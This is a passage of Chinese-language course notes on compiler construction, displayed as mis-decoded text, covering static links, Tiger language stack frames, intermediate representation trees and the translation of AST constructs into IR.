ˆå¸§ï¼ˆæˆ–è€…è¯´æ´»åŠ¨è®°å½•ï¼‰<ul>\n<li>è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¯´â€<code>f</code> statically encloses <code>g</code>â€œ</li>\n<li>å¦‚æœå¤šæ¬¡åµŒå¥—ï¼ŒåµŒå¥—æ¬¡æ•°ä¸º<code>N</code>ï¼Œè¿™äº›æŒ‡é’ˆä¼šæ„æˆä¸€ä¸ªé•¿ä¸º<code>N</code>çš„å•å‘é“¾è¡¨ä¸²è”èµ·æ ˆå¸§</li>\n<li>æ¯ä¸ªå‡½æ•°è®°å½•è‡ªå·±çš„åµŒå¥—æ·±åº¦<code>n</code></li>\n<li>å¦‚æœè®¿é—®äº†åœ¨æ·±åº¦<code>m</code>çš„å˜é‡ï¼Œåªéœ€æ²¿ç€è¯¥é“¾å‘ä¸Š<code>n-m</code>æ¬¡å°±å¯ä»¥æ‰¾åˆ°è¯¥å˜é‡æ‰€åœ¨çš„æ ˆå¸§</li>\n<li>ä¼˜ç¼ºç‚¹ï¼šOverheadå°ï¼Œä½†æ˜¯å› ä¸ºè¦é€šè¿‡é“¾è¡¨å‘ä¸Šç»è¿‡å¤šå±‚é€Ÿåº¦è¾ƒæ…¢</li>\n<li><img src=\"/compiler-construction-principles/static-link-nested.png\" loading=\"lazy\"></li>\n<li><strong>æ³¨æ„ï¼šæœ‰æ—¶<code>f</code>ä¸­åµŒå¥—çš„å‡½æ•°<code>g</code>ä¸ç›´æ¥å¼•ç”¨å¤–éƒ¨å˜é‡ï¼Œè€Œæ›´é‡Œé¢çš„å‡½æ•°<code>h</code>å¯èƒ½æ‰ä¼šï¼›è¿™æ—¶<code>h</code>çš„static linkå¯ä»¥è¶Šè¿‡<code>g</code></strong></li>\n</ul>\n</li>\n<li>Lamda lifting: ä»æœ€æ·±çš„ä¸€å±‚å¶è¿‡ç¨‹å¼€å§‹ï¼ŒæŠŠæ‰€æœ‰<code>g(a1)</code>ç”¨åˆ°çš„å¤–éƒ¨å˜é‡<code>o1</code> <code>o2</code>æ”¹å†™ä¸ºçœŸæ­£ä¼ å…¥çš„å‚æ•°ï¼Œäºæ˜¯å˜ä¸º<code>g(o1, o2, a1)</code>. å¦‚æ­¤é€æ¸å‘ä¸Šæ”¹å†™æ¯ä¸€å±‚å³å¯ã€‚<br><img src=\"/compiler-construction-principles/lambda-lifting.png\" loading=\"lazy\"></li>\n<li>Displayæ•°ç»„ï¼šä¸€ä¸ªå…¨å±€æ•°ç»„ï¼Œè®°å½•å½“å‰æ¯ä¸ªåµŒå¥—æ·±åº¦<code>i</code>å¯¹åº”çš„æ ˆå¸§åœ°å€ã€‚è¿™æ ·ä¸éœ€è¦ç»è¿‡é“¾è¡¨å³å¯ç›´æ¥æ‰¾åˆ°å˜é‡å¯¹åº”çš„æ ˆå¸§ã€‚</li>\n</ul>\n<h2 id=\"Part-12-Tigerè¯­è¨€ï¼šä¸€ä¸ªä¾‹å­\"><a href=\"#Part-12-Tigerè¯­è¨€ï¼šä¸€ä¸ªä¾‹å­\" class=\"headerlink\" title=\"Part 12: Tigerè¯­è¨€ï¼šä¸€ä¸ªä¾‹å­\"></a>Part 12: Tigerè¯­è¨€ï¼šä¸€ä¸ªä¾‹å­</h2><h3 id=\"Tigerè¯­è¨€çš„æ ˆå¸§å¸ƒå±€-Layout\"><a href=\"#Tigerè¯­è¨€çš„æ ˆå¸§å¸ƒå±€-Layout\" class=\"headerlink\" title=\"Tigerè¯­è¨€çš„æ ˆå¸§å¸ƒå±€(Layout)\"></a>Tigerè¯­è¨€çš„æ ˆå¸§å¸ƒå±€(Layout)</h3><p><img src=\"/compiler-construction-principles/layout.png\" alt=\"layout\" loading=\"lazy\"></p>\n<ul>\n<li>incoming parameters: è°ƒç”¨è€…ä¼ å…¥</li>\n<li>return address: è¿”å›<code>CALL</code>æŒ‡ä»¤</li>\n<li>local variables: éƒ¨åˆ†å¿…é¡»åœ¨æ ˆå¸§ä¸­æ”¾ç½®çš„å±€éƒ¨å˜é‡</li>\n<li>saved registers: è¯¥å‡½æ•°ä¿å­˜çš„ä¸€äº›å¯„å­˜å™¨å€¼ï¼Œä¸ºå…¶ä»–ç”¨é€”è…¾å‡ºå¯„å­˜å™¨</li>\n<li>out-going arguments: è°ƒç”¨å…¶ä»–å‡½æ•°æ—¶ä¼ é€’çš„å‚æ•°</li>\n<li>static link: å¦‚ä¸Šæ‰€è¿°</li>\n<li>FP&#x2F;SP: æŒ‡å‘åŸºå€&#x2F;æ ˆé¡¶</li>\n</ul>\n<h3 id=\"Tigerè¯­è¨€ç¼–è¯‘å™¨çš„æ ˆå¸§å®ç°\"><a href=\"#Tigerè¯­è¨€ç¼–è¯‘å™¨çš„æ ˆå¸§å®ç°\" class=\"headerlink\" title=\"Tigerè¯­è¨€ç¼–è¯‘å™¨çš„æ ˆå¸§å®ç°\"></a>Tigerè¯­è¨€ç¼–è¯‘å™¨çš„æ ˆå¸§å®ç°</h3><p><del>çœ‹èµ·æ¥å°±ä¸æ˜¯ä»€ä¹ˆä¼šè¯¦ç»†è€ƒçš„éƒ¨åˆ†</del></p>\n<p>formals &#x3D; formal-parameters (ä¸åŒ…æ‹¬static linkä¹‹ç±»éšè—çš„å‚æ•°)</p>\n<ul>\n<li>è®°å½•å˜é‡åœ¨å¯„å­˜å™¨ä¸­è¿˜æ˜¯åœ¨æ ˆå¸§ä¸­</li>\n<li>è®°å½•å˜é‡æ˜¯å¦é€ƒé€¸(escape)</li>\n<li>â€¦</li>\n</ul>\n<p>è¿›å…¥è¢«è°ƒç”¨å‡½æ•°çš„ä¸Šä¸‹æ–‡&#x3D;æ–°çš„æ ˆå¸§&#x3D;â€œè§†è§’åˆ‡æ¢(view shift)â€, è¿™æ˜¯ä¸åŒæœºå™¨&#x2F;æŒ‡ä»¤é›†çš„å®ç°éœ€è¦å®Œæˆçš„ã€‚<br><img src=\"/compiler-construction-principles/view-shift.png\" loading=\"lazy\"></p>\n<blockquote>\n<p>ğŸ’¡æœ¬è´¨ä¸Šï¼Œæˆ‘ä»¬åœ¨åšçš„äº‹å’ŒLab3é‡Œä¸ºæ¯ä¸€ä¸ªå‚æ•°åˆ†é…åœ°å€ï¼ŒæŠŠä¸€åˆ‡è¯»å†™æ”¾åœ¨å†…å­˜é‡Œæ˜¯ä¸€æ ·çš„ã€‚åªæ˜¯ä¸ºäº†æ•ˆç‡ï¼Œæœ‰æ—¶è¿™ä¸ªâ€œåœ°å€â€å¹¶ä¸å­˜åœ¨è€Œæ˜¯å‚¨å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼›æ­¤å¤–æœ‰çš„å˜é‡ä¼šé€ƒé€¸ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦å®ç°è®¿é—®çš„æ¥å£ï¼Œå¯¹åœ¨å¯„å­˜å™¨çš„å˜é‡æˆ–è€…ä¼šé€ƒé€¸çš„å˜é‡è¿›è¡Œä¸€äº›é¢å¤–å¤„ç†ã€‚</p>\n</blockquote>\n<p>å…¶ä»–trivialè¯é¢˜ï¼š</p>\n<ul>\n<li>Temporary: å±€éƒ¨å˜é‡çš„æŠ½è±¡åï¼Œä»£è¡¨ä¸€äº›æš‚å­˜åœ¨å¯„å­˜å™¨ä¸­çš„å€¼<ul>\n<li>æœ¬è´¨ä¸Šæ˜¯ä¸ºä¸åŒscopeé‡Œçš„ç›¸åŒå˜é‡åè¿›è¡Œé‡å‘½åï¼Œç±»ä¼¼æˆ‘ä»¬åœ¨lambdaæ¼”ç®—æ—¶åšçš„é‡å‘½åç­‰ä»·å˜æ¢ï¼š $ \\lambda x.x \\equiv \\lambda y.y$ æ‰€ä»¥ $\\lambda x.\\lambda x.x \\equiv \\lambda x.\\lambda y.y$, ç„¶åæ‰èƒ½æ— æ­§ä¹‰åœ°å¸¦å…¥x, y</li>\n</ul>\n</li>\n<li>Label: æ ‡è®°è¿˜ä¸èƒ½ç¡®å®šçš„æœºå™¨é™æ€çš„ã€ç‰©ç†çš„åœ°å€</li>\n</ul>\n<h3 id=\"æ€»ç»“ï¼šä¸¤å±‚æŠ½è±¡\"><a href=\"#æ€»ç»“ï¼šä¸¤å±‚æŠ½è±¡\" class=\"headerlink\" title=\"æ€»ç»“ï¼šä¸¤å±‚æŠ½è±¡\"></a>æ€»ç»“ï¼šä¸¤å±‚æŠ½è±¡</h3><p><img src=\"/compiler-construction-principles/two-layers.png\" loading=\"lazy\"></p>\n<ul>\n<li><code>frame.h</code> <code>temp.h</code> å°è£…äº†<strong>æœºå™¨æ— å…³</strong>çš„å˜é‡è§†è§’ï¼Œæˆ‘ä»¬æ— éœ€å…³å¿ƒæ˜¯åœ¨å†…å­˜è¿˜æ˜¯åœ¨å¯„å­˜å™¨ä¸­</li>\n<li><code>Translate</code>æ¨¡å—ç”¨äºåœ¨ä¸Šè¿°å°è£…çš„åŸºç¡€ä¸Šå°†é«˜çº§è¯­è¨€ç¿»è¯‘ä¸ºæœ‰å±‚æ¬¡çš„ã€ç”¨static linkè¿æ¥èµ·æ¥çš„å„ä¸ªå‡½æ•°ï¼Œç»´æŠ¤å‡½æ•°é—´çš„å±‚æ¬¡å…³ç³»ï¼›æ‰¾åˆ°è·¨å±‚æ¬¡çš„ã€å¯¹å¤–éƒ¨å˜é‡çš„è®¿é—®ï¼Œå¹¶æŠŠæ¯ä¸ªè®¿é—®å®šä½åˆ°å…·ä½“æŸä¸€å±‚å‡½æ•°çš„æŸä¸€ä¸ªå˜é‡ä¸Šã€‚<ul>\n<li>è¿™é‡Œï¼Œæˆ‘ä»¬è®©Static linkè¿™ä¸€æŒ‡é’ˆâ€œä¼ªè£…â€æˆä¸€ä¸ªä¼ ç»™åµŒå¥—å‡½æ•°çš„å‚æ•°</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Part-13-ä¸­é—´è¡¨ç¤º-IR\"><a href=\"#Part-13-ä¸­é—´è¡¨ç¤º-IR\" class=\"headerlink\" title=\"Part 13: ä¸­é—´è¡¨ç¤º(IR)\"></a>Part 13: ä¸­é—´è¡¨ç¤º(IR)</h2><h3 id=\"æ¦‚è¿°\"><a href=\"#æ¦‚è¿°\" class=\"headerlink\" title=\"æ¦‚è¿°\"></a>æ¦‚è¿°</h3><p>IR &#x3D; Intermediate Representation</p>\n<p>ç¼–è¯‘æµç¨‹åˆ’åˆ†ï¼š</p>\n<ul>\n<li>å‰ç«¯ï¼šæºä»£ç -&gt;è¯æ³•åˆ†æ-&gt;è¯­æ³•åˆ†æ-&gt;è¯­ä¹‰åˆ†æ-&gt;</li>\n<li>ä¸­ç«¯ï¼šIR1-&gt;IR2-&gt;â€¦-&gt;IRn-&gt;<ul>\n<li>è¿™ä¸ªè¿‡ç¨‹å¯åšä¸€äº›æœºå™¨æ— å…³ä¼˜åŒ–ï¼ˆæ¯”å¦‚å¾ªç¯å±•å¼€ï¼‰</li>\n</ul>\n</li>\n<li>åç«¯ï¼šæŒ‡ä»¤é€‰æ‹©-&gt;å¯„å­˜å™¨åˆ†é…-&gt;æŒ‡ä»¤è°ƒåº¦-&gt;æœºå™¨ç <ul>\n<li>è¿™ä¸ªè¿‡ç¨‹å¯åšä¸€äº›æœºå™¨ç›¸å…³ä¼˜åŒ–</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"ä¸ºä½•éœ€è¦IR\"><a href=\"#ä¸ºä½•éœ€è¦IR\" class=\"headerlink\" title=\"ä¸ºä½•éœ€è¦IR\"></a>ä¸ºä½•éœ€è¦IR</h3><ul>\n<li>æ›´æ¨¡å—åŒ–ï¼Œæ›´å¯è¿ç§»ï¼ˆè·¨å¹³å°ï¼‰<ul>\n<li>è€ƒè™‘nä¸ªè¯­è¨€å’Œmç§å¹³å°ï¼Œå¦‚æœæ²¡æœ‰IRåˆ™éœ€è¦n*mä¸ªç¼–è¯‘å™¨ï¼›å¼•å…¥ä¸€ä¸ªIRåå…ˆç»Ÿä¸€ç¿»è¯‘æˆIRï¼Œåˆ™åªéœ€è¦n+mä¸ªç¼–è¯‘å™¨</li>\n</ul>\n</li>\n<li>å¤šå±‚çš„ï¼šåˆ†å±‚åº”ç”¨ä¸åŒçš„åˆ†æå’Œä¼˜åŒ–ï¼ˆi.e. å˜æ¢ï¼‰<ul>\n<li>ä¾‹å¦‚GCC, LLVM, Rustâ€¦</li>\n</ul>\n</li>\n<li>å¯èƒ½ä¸¢å¤±å°‘éƒ¨åˆ†æœºå™¨ç‰¹å®šçš„ç»†èŠ‚ï¼Œä½†ä¸ä¼šæŸå¤±å¤ªå¤š</li>\n</ul>\n<p>ä¸€ä¸ªå¥½çš„IRåº”è¯¥ç®€å•ï¼Œç„¶åå°†å¤æ‚çš„ASTç¿»è¯‘ä¸ºIRä»£ç ï¼Œæœ€åç»„åˆä¸åŒä»£ç å—ã€‚</p>\n<h3 id=\"IRæ‚é¡¹\"><a href=\"#IRæ‚é¡¹\" class=\"headerlink\" title=\"IRæ‚é¡¹\"></a>IRæ‚é¡¹</h3><p>ï¼ˆä¸è¦æ±‚æŒæ¡ï¼‰</p>\n<ol>\n<li><p>IRåˆ†ç±»ï¼š</p>\n<ul>\n<li>é«˜å±‚IR: æä¾›è¯­è¨€ç‰¹æ€§çš„æ£€æµ‹ï¼ˆä¾‹å¦‚borrow checkingï¼‰</li>\n<li>ä¸­å±‚IR</li>\n<li>ä½å±‚IR: è´´è¿‘ç›®æ ‡è¯­è¨€ï¼Œæ˜“äºç”Ÿæˆ</li>\n</ul>\n</li>\n<li><p>è¡¨ç¤ºæ–¹å¼ï¼š</p>\n<ul>\n<li><strong>ç»“æ„åŒ–</strong><ul>\n<li>åŸºäºå›¾ï¼ˆæ ‘ã€æ— ç¯å›¾â€¦â€¦ï¼‰</li>\n</ul>\n</li>\n<li>çº¿æ€§Linear: å‚¨å­˜å¸ƒå±€æ˜¯çº¿æ€§çš„<ul>\n<li>æ ˆï¼ˆè™šæ‹Ÿï¼‰æœºã€<strong>ä¸‰åœ°å€ç </strong>â€¦â€¦</li>\n</ul>\n</li>\n<li>æ··åˆHybrid: èŠ‚ç‚¹å†…çº¿æ€§ï¼ŒèŠ‚ç‚¹é—´å›¾å½¢åŒ–<ul>\n<li>ç»å¸¸è§åˆ°çš„æ§åˆ¶æµå›¾(CFG)å°±æ˜¯ä¸€ç§</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>ä¸‰åœ°å€ç ï¼š</p>\n<ul>\n<li>æ˜¯ä¸€ç§çº¿æ€§çš„IR</li>\n<li>æ ¼å¼ï¼š<code>x = y op z</code></li>\n<li>æ¯ä¸ªæŒ‡ä»¤è‡³å¤šä¸€ä¸ªç®—ç¬¦<code>op</code>, è‡³å¤šä¸‰ä¸ªæ“ä½œæ•°ï¼ˆåœ°å€ï¼‰<code>x</code> <code>y</code> <code>z</code></li>\n<li>åœ°å€å¯ä»¥ä¸ºï¼š<ul>\n<li>æºç¨‹åºä¸­æ˜¾å¼çš„å˜é‡å</li>\n<li>å¸¸é‡ã€å­—é¢é‡</li>\n<li>ç¼–è¯‘å™¨ç”Ÿæˆçš„ä¸´æ—¶ä¸­é—´å˜é‡</li>\n</ul>\n</li>\n<li>ä¹Ÿå¯ä»¥è®°ä¸ºä¸€ä¸ªå››å…ƒç»„ï¼š<code>(op, x, y, z)</code> <code>(unary_op, x, y, _)</code> â€¦</li>\n</ul>\n</li>\n<li><p>é™æ€å•èµ‹å€¼SSA:</p>\n<p> Lab3å®ç°è¿‡ä½†<strong>ä¸è¦æ±‚æŒæ¡</strong>ã€‚<br> SSAæ˜¯ç‰¹æ®Šçš„ä¸‰åœ°å€ç ï¼šæ¯ä¸ªå˜é‡åªèƒ½è¢«èµ‹å€¼ä¸€æ¬¡<br> åŠ é€Ÿåˆ†æä¼˜åŒ–ï¼Œè¢«å¹¿æ³›åº”ç”¨ï¼ˆå¦‚LLVMï¼‰</p>\n</li>\n</ol>\n<h3 id=\"Tigerè¯­è¨€çš„IR-Tree\"><a href=\"#Tigerè¯­è¨€çš„IR-Tree\" class=\"headerlink\" title=\"Tigerè¯­è¨€çš„IR Tree\"></a>Tigerè¯­è¨€çš„IR Tree</h3><p>è®¸å¤šç°ä»£è¯­è¨€é‡‡ç”¨å¤šå±‚IR: AST-&gt;IR1-&gt;IR2-&gt;â€¦-&gt;IRk-&gt;æœºå™¨ç <br>Tigeråªä½¿ç”¨å•ä¸ªIR, ä¹Ÿå°±æ˜¯IR Tree: AST-&gt;IR Tree-&gt;æ±‡ç¼–-&gt;æœºå™¨ç </p>\n<p>IR Treeæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ ‘å½¢IR, åŒ…å«å¦‚ä¸‹æŒ‡ä»¤ï¼š</p>\n<ul>\n<li>CONST(i)</li>\n<li>NAME(n)</li>\n<li>TEMP(t)</li>\n<li>(TODO)â€¦</li>\n</ul>\n<p><strong>æ¯ä¸ªæŒ‡ä»¤éƒ½å¯¹åº”IR Treeçš„ä¸€é¢—å­æ ‘ã€‚æŒ‡ä»¤ä¸ºæ ¹ï¼Œæ“ä½œæ•°ä¸ºå…¶å­èŠ‚ç‚¹ã€‚</strong></p>\n<p>åœ¨è¿™ç§ä¸­é—´è¡¨ç¤ºä¸­ï¼Œæˆ‘ä»¬å‡å®šæœ‰æ— æ•°ä¸ªå¯„å­˜å™¨ã€‚</p>\n<p><strong>é‡è¦æŒ‡ä»¤ï¼šESEQ(s, e)</strong>:</p>\n<ol>\n<li>é¦–å…ˆï¼Œ<code>s</code>è¢«æ‰§è¡Œ(evaluate), å¯èƒ½å¸¦æœ‰å‰¯ä½œç”¨(side effect)</li>\n<li>è€Œåï¼Œ<code>e</code>è¢«æ‰§è¡Œä½œä¸ºæŒ‡ä»¤çš„å€¼</li>\n</ol>\n<p>ä¾‹å¦‚ï¼Œ<code>ESEQ(a=5, a+5)</code>ä¼šè¿”å›å€¼<code>10</code>, åŒæ—¶å‰¯ä½œç”¨æ˜¯<code>a</code>çš„å€¼å˜ä¸º5</p>\n<blockquote>\n<p>â—å‰¯ä½œç”¨&#x3D;æ›´æ–°äº†å†…å­˜å•å…ƒæˆ–æ›´æ”¹äº†å¯„å­˜å™¨çš„å€¼</p>\n</blockquote>\n<h3 id=\"ä»ASTç”ŸæˆIR-Tree\"><a href=\"#ä»ASTç”ŸæˆIR-Tree\" class=\"headerlink\" title=\"ä»ASTç”ŸæˆIR Tree\"></a>ä»ASTç”ŸæˆIR Tree</h3><p><del>è¿™éƒ¨åˆ†çœ‹çœ‹å°±è¡Œ</del></p>\n<ol>\n<li><p>æ€»è§ˆ<br>Tigerè¯­è¨€å¹¶ä¸åŒºåˆ†è¯­å¥(statement)å’Œè¡¨è¾¾å¼ã€‚<br>ASTä¸­çš„è¡¨è¾¾å¼(expression)å¯ä»¥åˆ†ä¸ºï¼š</p>\n<ul>\n<li>è¿”å›æ•°å€¼çš„ï¼Œè®°ä¸º<code>Ex</code></li>\n<li>ä¸è¿”å›æ•°å€¼çš„ï¼Œè®°ä¸º<code>Nx</code></li>\n<li>è¿”å›å¸ƒå°”å€¼ï¼šç”¨äºæ¡ä»¶è·³è½¬ï¼Œè®°ä¸º<code>Cx</code><br> åŠ ä¸Šä¸€äº›è¾…åŠ©å‡½æ•°<code>unEx</code> <code>unNx</code> <code>unCx</code>ç”¨äºåœ¨ä¸åŒç±»å‹ä¹‹é—´è½¬æ¢ã€‚</li>\n<li>ä¾‹å¦‚<code>flag:= (a&gt;b | c&lt;d)</code>, å³ä¾§æ˜¯<code>Cx</code>æ²¡æœ‰è¿”å›å€¼ï¼Œè¦è½¬æ¢æˆ<code>Ex</code><ul>\n<li>è¡¨è¾¾å¼ä¸Šä¸‹æ–‡ä¸åŒï¼Œå«ä¹‰ä¹Ÿä¸åŒï¼Œå› æ­¤éœ€è¦æˆ‘ä»¬åœ¨è¿™ä¸€æ­¥æ ¹æ®æƒ…å†µåƒè¿™æ ·è¿›è¡Œè½¬æ¢</li>\n<li>è¯´åˆ°åº•ï¼ŒIRç¿»è¯‘æ˜¯ä¸Šä¸‹æ–‡æœ‰å…³é—®é¢˜ï¼Œä¸ä¾¿ç”¨CFGåˆ»ç”»</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>å˜é‡ç¿»è¯‘</p>\n<ul>\n<li>æ™®é€šå˜é‡<ul>\n<li>ç›¸å¯¹FPçš„ä¾¿å®œæ˜¯å›ºå®šçš„ã€‚å‡è®¾åç§»é‡ä¸º<code>k</code>ï¼Œåˆ™å†…å­˜ä¸­å˜é‡çš„å€¼ä¸ºï¼š<code>MEM(BINOP(PLUS,TEMP fp, CONST k))</code></li>\n<li>æ³¨æ„ï¼Œå¯¹äºä¸€äº›å¸¸è§çš„æ“ä½œï¼ˆä¾‹å¦‚åŠ æ³•ï¼‰æˆ‘ä»¬æœ‰å¦‚ä¸‹ç®€å†™ï¼š<code>BINOP(PLUS, a, b) = +(a, b)</code></li>\n<li>å› æ­¤è‹¥å˜é‡<code>a</code>åœ¨å†…å­˜ä¸­ä¸º<code>InFrame(k)</code>, åˆ™<code>F_Exp(a,T_Temp(F_FP())</code>ç¿»è¯‘ä¸º<code>MEM(BINOP(PLUS,TEMPFP,CONST(k)))</code></li>\n<li>è€Œå¦‚æœå˜é‡<code>b</code>åœ¨å¯„å­˜å™¨ä¸­ä¸º<code>InReg(t_832)</code>, åˆ™ç›´æ¥ç¿»è¯‘ä¸º<code>TEMP(t_832)</code></li>\n</ul>\n</li>\n<li>æ•°ç»„å˜é‡<ul>\n<li>å…¶å®å°±æ˜¯ä¸€ç§å›ºå®šçš„æŒ‡é’ˆï¼Œåªæ˜¯æ²¡æ³•ç›´æ¥æ‹·è´ï¼ˆè¿™ä¸€ç‚¹å–å†³äºå…·ä½“è¯­è¨€æœ‰æ‰€ä¸åŒï¼ŒPascalå°±å¯ä»¥ï¼‰</li>\n<li>Tigerè¯­è¨€æä¾›<code>Record</code>ç±»å‹ï¼Œç±»ä¼¼ç»“æ„ä½“ã€‚æœ¬è´¨ä¸Šè¿˜æ˜¯æŒ‡é’ˆï¼Œå¯ä»¥ï¼ˆæµ…ï¼‰æ‹·è´</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>å·¦å€¼ä¸å³å€¼<br> åˆç•¥çš„ç†è§£ï¼š<br> å³å€¼ï¼šå¯ä»¥å‡ºç°åœ¨èµ‹å€¼è¯­å¥å³ä¾§ï¼Œä¸èƒ½å‡ºç°åœ¨å·¦ä¾§<br> å·¦å€¼ï¼šå¯ä»¥å‡ºç°åœ¨èµ‹å€¼è¯­å¥å·¦ä¾§å’Œå³ä¾§</p>\n<blockquote>\n<p>ğŸ¤­å½“ç„¶C++ä½œä¸ºä¸€é—¨åšå¤§ç²¾æ·±çš„è¯­è¨€æŠŠå·¦å€¼ã€å³å€¼ã€çº¯å³å€¼ã€å°†äº¡å€¼çš„å®šä¹‰å’Œç”¨æ³•ç»™ç©å‡ºèŠ±æ¥äº†ã€‚å·¦å€¼å’Œå°†äº¡å€¼åˆç§°æ³›å·¦å€¼(generalized lvalue&#x3D;glvalue)ï¼Œçº¯å³å€¼å’Œå°†äº¡å€¼åˆç§°å³å€¼(right value&#x3D;rvalue)ã€‚</p>\n</blockquote>\n<p> å·¦å€¼&#x2F;å³å€¼å„è‡ªåˆåˆ†ä¸ºä¸¤ç§ï¼š</p>\n<ul>\n<li><strong>æ ‡é‡(scalar)</strong>: åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼ˆæ¯”å¦‚å•ä¸ªçš„å˜é‡åï¼‰</li>\n<li><strong>ç»“æ„åŒ–çš„(structured)</strong>: ä¾‹å¦‚Cä¸­çš„ç»“æ„ä½“å’Œæ•°ç»„<ul>\n<li>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»å†…å­˜ä¸­å–å€¼çš„æŒ‡ä»¤<code>MEM(addr)</code>è¦ä¿®æ”¹ä¸º<code>MEM(addr, size)</code></li>\n<li>å½“ç„¶Tigerè¯­è¨€å¹¶ä¸éœ€è¦ï¼šå› ä¸ºåœ¨Tigerè¯­è¨€ä¸­æ‰€æœ‰å˜é‡å’Œå·¦å€¼éƒ½æ˜¯æ ‡é‡ï¼ˆTigerçš„æ•°ç»„å’Œrecordæœ¬è´¨ä¸Šåªæ˜¯æŒ‡é’ˆï¼‰ã€‚</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>æ‚é¡¹</p>\n</li>\n</ol>\n<p><strong>å¯¹äºè¿™éƒ¨åˆ†å†…å®¹ï¼Œå¦‚æœè®¤çœŸå†™è¿‡Lab3: å®ç°AST-&gt;IRçš„åº”è¯¥å¯ä»¥ç›´æ¥æ— è§†ã€‚</strong></p>\n<ul>\n<li><p>ä¸‹æ ‡ç´¢å¼•ä¸fieldé€‰æ‹©</p>\n<ul>\n<li>æ•°ç»„ï¼šè€ƒè™‘<code>a[i]</code>, å…¶å®é™…åœ°å€ä¸º<code>(i-l)*s+a</code>, å…¶ä¸­aä¸ºåŸºåœ°å€ï¼Œsä¸ºå…ƒç´ å¤§å°ï¼Œlä¸ºæœ€å°ç´¢å¼•å€¼ï¼ˆlå–0æ—¶å³ä¸º<code>i*s+a</code>ï¼‰ã€‚</li>\n<li>Record: <code>a.f</code>åœ°å€è‡ªç„¶æ˜¯<code>offset(f)+a</code>, å…¶ä¸­<code>offset(f)</code>ä»£è¡¨è¯¥fieldåœ¨Recordä¸­çš„å›ºå®šåç§»é‡</li>\n</ul>\n</li>\n<li><p>å†…å­˜å®‰å…¨</p>\n<p>å†…å­˜æ¼æ´æ™®éå­˜åœ¨ä¸”å±å®³å¤§ã€‚<br>éƒ¨åˆ†è§£å†³æ–¹æ³•ï¼š</p>\n<ul>\n<li>æ’å…¥é¢å¤–çš„æŒ‡ä»¤åŠ¨æ€æ£€æŸ¥æ•°ç»„è¶Šç•Œæˆ–ç©ºæŒ‡é’ˆ<ul>\n<li>æ€§èƒ½â†“â†“â†“</li>\n</ul>\n</li>\n<li>é™æ€æ£€æŸ¥ï¼šä¾‹å¦‚borrow checker</li>\n</ul>\n</li>\n<li><p>è¿ç®—ç¬¦ä¸æ¡ä»¶è¯­å¥</p>\n<p>äºŒå…ƒè¿ç®—ç¬¦çš„ç¿»è¯‘æ˜¯æ˜¾ç„¶çš„ã€‚<br>ä¸€å…ƒè¿ç®—ç¬¦å¯ä»¥ç”±ç­‰æ•ˆçš„äºŒå…ƒè¿ç®—ç¬¦è¡¨è¾¾å¼ä»£æ›¿ï¼š<code>-a</code> &#x3D; <code>0-a</code> â€¦<br>æ¡ä»¶è¡¨è¾¾å¼å¯ä»¥è½¬å†™ä¸ºæ¡ä»¶è·³è½¬ï¼ŒåŒæ—¶è¿˜èƒ½å®ç°çŸ­è·¯åŠŸèƒ½ã€‚</p>\n</li>\n<li><p>If, While, For</p>\n<p>é€šè¿‡å¤šä¸ªLABELå’Œæ¡ä»¶è·³è½¬å®Œæˆã€‚<br>ç»“æ„ï¼š</p>\n<ul>\n<li>If(cond): <code>cjump(cond,:TRUE,:FALSE)</code> <code>:TRUE</code> <code>then</code> <code>:FALSE</code> <code>else</code></li>\n<li>While(cond): <code>:TEST</code> <code>cjump(cond,...)</code> <code>body</code> <code>:DONE</code><ul>\n<li>é‡åˆ°breakåˆ™è·³è½¬åˆ°<code>:DONE</code>, é‡åˆ°continueåˆ™è·³è½¬åˆ°<code>:TEST</code></li>\n</ul>\n</li>\n<li>For(init;cond;each): è½¬å†™ä¸ºWhileå³å¯ã€‚ä¸è¿‡è¦è®°å¾—åŠæ—¶è·³å‡ºå¾ªç¯ï¼Œå› æ­¤åœ¨å¼€å¤´å’Œæ‰§è¡Œ<code>each</code>å‰éƒ½è¦åˆ¤æ–­<code>cond</code>æ˜¯å¦æˆç«‹ã€‚</li>\n</ul>\n</li>\n<li><p>å‡½æ•°è°ƒç”¨</p>\n<p>æ˜¾ç„¶çš„ã€‚ä½†æ˜¯è®°å¾—åœ¨å‚æ•°åˆ—è¡¨å¼€å¤´åŠ å…¥static link:<br><code>CALL(NAME :LABEL_f,[SL, e1, e2, ..., en])</code></p>\n</li>\n<li><p>ç±»å‹ã€å˜é‡ä¸å‡½æ•°å®šä¹‰</p>\n<ul>\n<li>ä¸¢å¼ƒç±»å‹å®šä¹‰ï¼ˆæ¯•ç«Ÿåªæ˜¯åˆ«åï¼‰</li>\n<li>ç¡®å®šå˜é‡ç›¸å¯¹å‡½æ•°frameçš„åç§»</li>\n<li>æŠŠå˜é‡åˆå§‹åŒ–å€¼è½¬ä¸ºèµ‹å€¼è¯­å¥ï¼Œæ’å…¥åˆå§‹åŒ–å¤„</li>\n<li>å‡½æ•°å®šä¹‰åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š<ul>\n<li>prologue:<ul>\n<li>å‡½æ•°å…¥å£çš„LABELæ ‡è®°</li>\n<li>æ›´æ”¹æ ˆå¸§çš„FP&#x2F;SPä»¥åˆ›å»ºæ–°æ ˆå¸§</li>\n<li>ä¿å­˜ä¸é€ƒé€¸çš„å‚æ•°åˆ°å¯ç”¨å¯„å­˜å™¨</li>\n<li>ä¿å­˜é€ƒé€¸çš„å‚æ•°åˆ°æ ˆå¸§ï¼ˆåŒ…å«Static linkï¼‰</li>\n<li>ä¿å­˜Callee-saveçš„å¯„å­˜å™¨åˆ°æ ˆå¸§ï¼ˆä¾‹å¦‚è¿”å›åœ°å€ï¼‰</li>\n</ul>\n</li>\n<li>body: ç¿»è¯‘çš„å‡½æ•°ä½“</li>\n<li>epiloge:<ul>\n<li>ä¿å­˜è¿”å›å€¼åˆ°å¯„å­˜å™¨ï¼ˆæˆ–æ 